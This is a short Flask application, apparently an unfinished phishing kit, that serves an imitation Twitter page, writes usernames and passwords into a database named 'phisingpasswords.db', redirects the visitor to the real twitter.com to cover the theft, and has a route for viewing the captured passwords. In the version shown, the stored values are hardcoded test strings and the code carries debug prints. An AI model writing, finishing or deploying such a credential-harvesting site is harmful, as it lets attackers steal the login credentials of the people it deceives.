import sqlite3
from flask import Flask, render_template, request,redirect
app = Flask(__name__)
@app.route('/')
def display_passwords():
    print("Did this worrrkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk?")
    return render_template('showpasswords.html')
@app.route('/twitter')
def twitter():
    return render_template('twitter.html')
@app.route('/send_password')
def send_password():
    con = sqlite3.connect("phisingpasswords.db")
    sql = 'INSERT INTO USER_PASS(username,password) VALUES(?, ?)'
    cur = con.cursor()
    cur.execute(sql,["test5","test5"])
    con.commit()
    print("inserted into database maybe")
    return redirect("http://twitter.com")